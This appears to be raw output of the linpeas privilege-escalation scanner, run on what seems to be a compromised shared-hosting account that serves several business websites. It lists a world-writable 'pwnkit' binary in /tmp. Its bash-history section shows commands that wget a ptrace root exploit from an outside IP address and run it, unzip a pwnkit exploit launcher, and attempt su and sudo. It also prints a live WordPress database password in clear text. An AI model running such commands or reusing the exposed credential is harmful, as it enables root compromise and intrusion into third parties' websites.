-rw-r--r-- 1 root root 19159 Aug  9  2023 /opt/alt/php72/usr/share/pear/.filemap
-rw-r--r-- 1 root root 0 Aug  9  2023 /opt/alt/php72/usr/share/pear/.lock
-rw-r--r-- 1 root root 19104 Aug  9  2023 /opt/alt/php56/usr/share/pear/.filemap
grep: write error: Broken pipe

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 u311353020 o50030915 1000 Apr 20 21:39 /tmp/Fd5pEH.gif
-rw-r--r-- 1 u311353020 o50030915 2937 Apr 21 00:07 /tmp/VYCAUF.gif
-rw-r--r-- 1 u311353020 o50030915 2923 Apr 20 21:43 /tmp/Irtrde.gif
-rw-r--r-- 1 u311353020 o50030915 2930 Apr 20 21:48 /tmp/ws9wV3.gif
-rw-r--r-- 1 u311353020 o50030915 2922 Apr 20 21:47 /tmp/aS0CQR.gif
-rw-r--r-- 1 u311353020 o50030915 997 Apr 20 21:45 /tmp/59fp7z.gif
-rw-r--r-- 1 u311353020 o50030915 1000 Apr 20 23:12 /tmp/ckDwK8.gif
-rw-r--r-- 1 u311353020 o50030915 991 Apr 20 23:58 /tmp/MwJI4E.gif
-rw-r--r-- 1 u311353020 o50030915 996 Apr 20 21:32 /tmp/IW9Xu7.gif
-rw-r--r-- 1 u311353020 o50030915 993 Apr 20 21:52 /tmp/WlXZR0.gif
-rw-r--r-- 1 u311353020 o50030915 2922 Apr 20 22:22 /tmp/4YDD5S.gif
-rw-r--r-- 1 u311353020 o50030915 2931 Apr 20 21:53 /tmp/f3Oa3v.gif
-rw-r--r-- 1 u311353020 o50030915 993 Apr 20 20:31 /tmp/i7iqoR.gif
-rw-r--r-- 1 u311353020 o50030915 2926 Apr 20 21:51 /tmp/lQ1k3F.gif
-rw-r--r-- 1 u311353020 o50030915 2926 Apr 20 21:17 /tmp/m5HLEM.gif
-rw-r--r-- 1 u311353020 o50030915 2512305 Apr 20 20:56 /tmp/linpeas_basic.log
-rw-r--r-- 1 u311353020 o50030915 999 Apr 20 22:32 /tmp/dyyPdc.gif
-rw-r--r-- 1 u311353020 o50030915 2927 Apr 20 21:56 /tmp/KOcCx7.gif
-rw-r--r-- 1 u311353020 o50030915 870 Apr 20 23:53 /tmp/TqCr2H.gif
-rw-r--r-- 1 u311353020 o50030915 2923 Apr 21 00:06 /tmp/f7NGxW.gif
-rw-r--r-- 1 u311353020 o50030915 2921 Apr 20 23:27 /tmp/r7wYGq.gif
-rw-r--r-- 1 u311353020 o50030915 2926 Apr 20 23:57 /tmp/3K4XEO.gif
-rw-r--r-- 1 u311353020 o50030915 1000 Apr 21 00:23 /tmp/4sKNFu.gif
-rw-r--r-- 1 u311353020 o50030915 2920 Apr 20 20:39 /tmp/PfqtWP.gif
-rw-r--r-- 1 u311353020 o50030915 2934 Apr 20 21:52 /tmp/4UxP8H.gif
-rw-r--r-- 1 u311353020 o50030915 2931 Apr 20 21:58 /tmp/dpY7Re.gif
-rw-r--r-- 1 u311353020 o50030915 2921 Apr 20 23:26 /tmp/2fCyCH.gif
-rw-r--r-- 1 u311353020 o50030915 1031 Apr 20 22:31 /tmp/2fCoYZ.gif
-rw-r--r-- 1 u311353020 o50030915 858 Apr 21 00:06 /tmp/Fy4c1v.gif
-rw-r--r-- 1 u311353020 o50030915 991 Apr 20 23:19 /tmp/6WL1uo.gif
-rw-r--r-- 1 u311353020 o50030915 2930 Apr 20 21:58 /tmp/WWuHyn.gif
-rwxrwxrwx 1 u311353020 o50030915 16792 Apr 15 23:03 /tmp/pwnkit
-rw-r--r-- 1 u311353020 o50030915 2926 Apr 20 21:45 /tmp/3dT4Fu.gif
-rw-r--r-- 1 u311353020 o50030915 999 Apr 21 00:05 /tmp/adXSIu.gif
-rw-r--r-- 1 u311353020 o50030915 2925 Apr 21 00:16 /tmp/ZS6rGO.gif
-rw-r--r-- 1 u311353020 o50030915 997 Apr 20 23:53 /tmp/Ptzad9.gif
-rw-r--r-- 1 u311353020 o50030915 2926 Apr 20 21:17 /tmp/hmBsNl.gif
-rw-r--r-- 1 u311353020 o50030915 444943 Apr 20 20:50 /tmp/linpeas.log
-rw-r--r-- 1 u311353020 o50030915 996 Apr 20 22:31 /tmp/Jtk5Gg.gif
-rw-r--r-- 1 u311353020 o50030915 2929 Apr 21 00:04 /tmp/nPjEJm.gif
-rw-r--r-- 1 u311353020 o50030915 855 Apr 20 20:44 /tmp/JLWeBK.gif
-rw-r--r-- 1 u311353020 o50030915 2924 Apr 20 20:33 /tmp/HdIU4k.gif
-rw-r--r-- 1 u311353020 o50030915 2922 Apr 20 23:58 /tmp/awN8X7.gif
-rw-r--r-- 1 u311353020 o50030915 2928 Apr 21 00:05 /tmp/y1MR55.gif
-rw-r--r-- 1 u311353020 o50030915 861 Apr 20 21:06 /tmp/3u5yPD.gif
-rw-r--r-- 1 u311353020 o50030915 2924 Apr 20 21:54 /tmp/stKhKN.gif
-rw-r--r-- 1 u311353020 o50030915 865 Apr 20 22:32 /tmp/4Klt5A.gif
-rw-r--r-- 1 u311353020 o50030915 2927 Apr 20 21:44 /tmp/Dfn4Rf.gif
-rw-r--r-- 1 u311353020 o50030915 2929 Apr 20 21:44 /tmp/BhXGSd.gif
-rw-r--r-- 1 u311353020 o50030915 872 Apr 20 22:06 /tmp/5itieZ.gif
-rw-r--r-- 1 u311353020 o50030915 2929 Apr 21 00:06 /tmp/MKKUGC.gif
-rw-r--r-- 1 u311353020 o50030915 1002 Apr 20 21:39 /tmp/LLnh4b.gif
-rw-r--r-- 1 u311353020 o50030915 1001 Apr 21 00:06 /tmp/UGQwmV.gif
-rw-r--r-- 1 u311353020 o50030915 2924 Apr 20 20:56 /tmp/naf3Ab.gif
-rw-r--r-- 1 u311353020 o50030915 2922 Apr 20 21:44 /tmp/2OU395.gif
-rw-r--r-- 1 u311353020 o50030915 2928 Apr 20 23:54 /tmp/4kSL06.gif
-rw-r--r-- 1 u311353020 o50030915 857 Apr 20 23:25 /tmp/UN55Z0.gif
-rw-r--r-- 1 u311353020 o50030915 996 Apr 20 21:06 /tmp/Zc4U10.gif
-rw-r--r-- 1 u311353020 o50030915 2923 Apr 20 21:47 /tmp/m6Yg9C.gif
-rw-r--r-- 1 u311353020 o50030915 2922 Apr 20 23:57 /tmp/0R5MOk.gif
-rw-r--r-- 1 u311353020 o50030915 1002 Apr 20 22:06 /tmp/UuKv35.gif
-rw-r--r-- 1 u311353020 o50030915 822 Apr 21 00:20 /tmp/p7HqAH.gif
-rw-r--r-- 1 u311353020 o50030915 2922 Apr 20 23:26 /tmp/tcKEZR.gif
-rw-r--r-- 1 u311353020 o50030915 997 Apr 20 22:06 /tmp/bwM49l.gif
-rw-r--r-- 1 u311353020 o50030915 2928 Apr 20 22:06 /tmp/uyWnVD.gif
-rw-r--r-- 1 u311353020 o50030915 2923 Apr 20 23:58 /tmp/Vt7u1A.gif
-rw-r--r-- 1 u311353020 o50030915 867 Apr 20 21:45 /tmp/9nRjLq.gif
-rw-r--r-- 1 u311353020 o50030915 2926 Apr 20 20:39 /tmp/J3ERQO.gif
-rw-r--r-- 1 u311353020 o50030915 2928 Apr 20 23:57 /tmp/UA6vDg.gif
-rw-r--r-- 1 u311353020 o50030915 860 Apr 20 20:32 /tmp/FmHNaE.gif

╔══════════╣ Searching passwords in history files
/home/u311353020/.bash_history:wget http://206.238.114.38:8000/exp/ptrace_traceme_root
/home/u311353020/.bash_history:./ptrace_traceme_root
/home/u311353020/.bash_history:which pkexec
/home/u311353020/.bash_history:sudo -i
/home/u311353020/.bash_history:su
/home/u311353020/.bash_history:passwd
/home/u311353020/.bash_history:unzip pwnkit_exploit_root_launcher.zip
/home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/_whatsnew_history.html:        a data loss bug in IE when there are @import statements in the editor's CSS files,
/home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/_whatsnew_history.html:        <li>The editor package now has a root directory called &quot;FCKeditor&quot;.</li>
/home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/_whatsnew_history.html:        <li><strong>Mongolian</strong> (by Lkamtseren Odonbaatar) </li>
/home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/_whatsnew_history.html:        uses the /UserImages/ folder in the root of the web site as the files container
/home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/_whatsnew_history.html:        Create these files in the root folder of your web site, if needed. The first one
Binary file /home/u311353020/domains/grupors.com.mx/public_html/old/images/table_background_history.gif matches
/home/u311353020/domains/grupors.com.mx/public_html/old/includes/classes/navigation_history.php:        $key=$kv['key'];
/home/u311353020/domains/grupors.com.mx/public_html/old/includes/classes/navigation_history.php:        $this->$key=$kv['value'];
Binary file /home/u311353020/domains/grupors.com.mx/public_html/old/includes/languages/english/images/buttons/button_history.gif matches
Binary file /home/u311353020/domains/grupors.com.mx/public_html/old/includes/languages/espanol/images/buttons/button_history.gif matches
Binary file /opt/alt/python37/lib64/python3.7/idlelib/idle_test/__pycache__/test_history.cpython-37.opt-1.pyc matches
Binary file /opt/alt/python37/lib64/python3.7/idlelib/idle_test/__pycache__/test_history.cpython-37.opt-2.pyc matches
Binary file /opt/alt/python37/lib64/python3.7/idlelib/idle_test/__pycache__/test_history.cpython-37.pyc matches
/opt/alt/python37/lib64/python3.7/idlelib/idle_test/test_history.py:    @classmethod
/opt/alt/python37/lib64/python3.7/idlelib/idle_test/test_history.py:    @classmethod
/opt/alt/python37/lib64/python3.7/idlelib/idle_test/test_history.py:        cls.root = tk.Tk()
/opt/alt/python37/lib64/python3.7/idlelib/idle_test/test_history.py:        cls.root.withdraw()
/opt/alt/python37/lib64/python3.7/idlelib/idle_test/test_history.py:        self.text = text = TextWrapper(self.root)
/opt/alt/python37/lib64/python3.7/idlelib/idle_test/test_history.py:    @classmethod
/opt/alt/python37/lib64/python3.7/idlelib/idle_test/test_history.py:        cls.root.destroy()
/opt/alt/python37/lib64/python3.7/idlelib/idle_test/test_history.py:        del cls.root

╔══════════╣ Searching passwords in config PHP files
/home/u311353020/domains/entornoclean.mx/public_html/wp-admin/setup-config.php:         $pwd    = trim( wp_unslash( $_POST['pwd'] ) );
/home/u311353020/domains/fanrich.com.mx/public_html/wp-admin/setup-config.php:          $pwd    = trim( wp_unslash( $_POST['pwd'] ) );
/home/u311353020/domains/fanrich.com.mx/public_html/wp-config.php:define( 'DB_PASSWORD', "wpQ&kSD6:" );
/home/u311353020/domains/fanrich.com.mx/public_html/wp-content/plugins/duplicator/classes/class.archive.config.php:    public $dbuser         = null;

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/password-auth
/etc/trusted-key.key
/home/u311353020/domains/entornoclean.mx/public_html/wp-admin/includes/class-wp-application-passwords-list-table.php
/home/u311353020/domains/entornoclean.mx/public_html/wp-admin/js/application-passwords.js
/home/u311353020/domains/entornoclean.mx/public_html/wp-admin/js/application-passwords.min.js
/home/u311353020/domains/entornoclean.mx/public_html/wp-admin/js/password-strength-meter.js
/home/u311353020/domains/entornoclean.mx/public_html/wp-admin/js/password-strength-meter.min.js
  #)There are more creds/passwds files in the previous parent folder

/home/u311353020/domains/entornoclean.mx/public_html/wp-includes/rest-api/endpoints/class-wp-rest-application-passwords-controller.php
/home/u311353020/domains/fanrich.com.mx/public_html/wp-admin/includes/class-wp-application-passwords-list-table.php
/home/u311353020/domains/fanrich.com.mx/public_html/wp-admin/js/application-passwords.js
/home/u311353020/domains/fanrich.com.mx/public_html/wp-admin/js/application-passwords.min.js
/home/u311353020/domains/fanrich.com.mx/public_html/wp-admin/js/password-strength-meter.js
/home/u311353020/domains/fanrich.com.mx/public_html/wp-admin/js/password-strength-meter.min.js
  #)There are more creds/passwds files in the previous parent folder

/home/u311353020/domains/fanrich.com.mx/public_html/wp-content/plugins/duplicator/installer/dup-installer/assets/js/password-strength
/home/u311353020/domains/fanrich.com.mx/public_html/wp-content/plugins/duplicator/installer/dup-installer/assets/js/password-strength/password.css
/home/u311353020/domains/fanrich.com.mx/public_html/wp-content/plugins/duplicator/installer/dup-installer/assets/js/password-strength/password.js
/home/u311353020/domains/fanrich.com.mx/public_html/wp-content/plugins/duplicator/installer/dup-installer/assets/js/password-strength/passwordstrength.jpg
/home/u311353020/domains/fanrich.com.mx/public_html/wp-content/plugins/duplicator/installer/dup-installer/classes/class.password.php
/home/u311353020/domains/fanrich.com.mx/public_html/wp-includes/class-wp-application-passwords.php
/home/u311353020/domains/fanrich.com.mx/public_html/wp-includes/rest-api/endpoints/class-wp-rest-application-passwords-controller.php
/home/u311353020/domains/farmaceuticaambriz.com/public_html/wp-admin/includes/class-wp-application-passwords-list-table.php
/home/u311353020/domains/farmaceuticaambriz.com/public_html/wp-admin/js/application-passwords.js
/home/u311353020/domains/farmaceuticaambriz.com/public_html/wp-admin/js/application-passwords.min.js
/home/u311353020/domains/farmaceuticaambriz.com/public_html/wp-admin/js/password-strength-meter.js
/home/u311353020/domains/farmaceuticaambriz.com/public_html/wp-admin/js/password-strength-meter.min.js
  #)There are more creds/passwds files in the previous parent folder

/home/u311353020/domains/farmaceuticaambriz.com/public_html/wp-includes/rest-api/endpoints/class-wp-rest-application-passwords-controller.php
/home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/includes/functions/password_funcs.php
/home/u311353020/domains/grupors.com.mx/public_html/old/images/table_background_password_forgotten.gif
/home/u311353020/domains/grupors.com.mx/public_html/old/includes/functions/password_funcs.php
/home/u311353020/domains/grupors.com.mx/public_html/old/includes/languages/english/account_password.php
/home/u311353020/domains/grupors.com.mx/public_html/old/includes/languages/english/password_forgotten.php
/home/u311353020/domains/grupors.com.mx/public_html/old/includes/languages/espanol/account_password.php
/home/u311353020/domains/grupors.com.mx/public_html/old/includes/languages/espanol/password_forgotten.php
/home/u311353020/domains/grupors.com.mx/public_html/old/includes/modules/action_recorder/ar_reset_password.php
/home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-admin/includes/class-wp-application-passwords-list-table.php
/home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-admin/js/application-passwords.js
/home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-admin/js/application-passwords.min.js
/home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-admin/js/password-strength-meter.js
/home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-admin/js/password-strength-meter.min.js
  #)There are more creds/passwds files in the previous parent folder

/home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/upgrade/wordpress-5.7.7-GXcX9F/wordpress/wp-admin/js/application-passwords.js
/home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/upgrade/wordpress-5.7.7-GXcX9F/wordpress/wp-admin/js/application-passwords.min.js
/home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/upgrade/wordpress-5.7.7-GXcX9F/wordpress/wp-admin/js/password-strength-meter.js
/home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/upgrade/wordpress-5.7.7-GXcX9F/wordpress/wp-admin/js/password-strength-meter.min.js
  #)There are more creds/passwds files in the previous parent folder

/home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/upgrade/wordpress-5.7.7-GXcX9F/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-application-passwords-controller.php
/home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-includes/class-wp-application-passwords.php
/home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-includes/rest-api/endpoints/class-wp-rest-application-passwords-controller.php
/home/u311353020/domains/grupors.com.mx/public_html/site1/css/components/form-password.almost-flat.css
/home/u311353020/domains/grupors.com.mx/public_html/site1/css/components/form-password.almost-flat.min.css
/home/u311353020/domains/grupors.com.mx/public_html/site1/css/components/form-password.css
/home/u311353020/domains/grupors.com.mx/public_html/site1/css/components/form-password.gradient.css
  #)There are more creds/passwds files in the previous parent folder

/home/u311353020/domains/grupors.com.mx/public_html/site1/js/components/form-password.min.js
/home/u311353020/domains/hipermaq.com/public_html/wp-admin/includes/class-wp-application-passwords-list-table.php
/home/u311353020/domains/hipermaq.com/public_html/wp-admin/js/application-passwords.js
/home/u311353020/domains/hipermaq.com/public_html/wp-admin/js/application-passwords.min.js
/home/u311353020/domains/hipermaq.com/public_html/wp-admin/js/password-strength-meter.js
/home/u311353020/domains/hipermaq.com/public_html/wp-admin/js/password-strength-meter.min.js
  #)There are more creds/passwds files in the previous parent folder


╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r' 
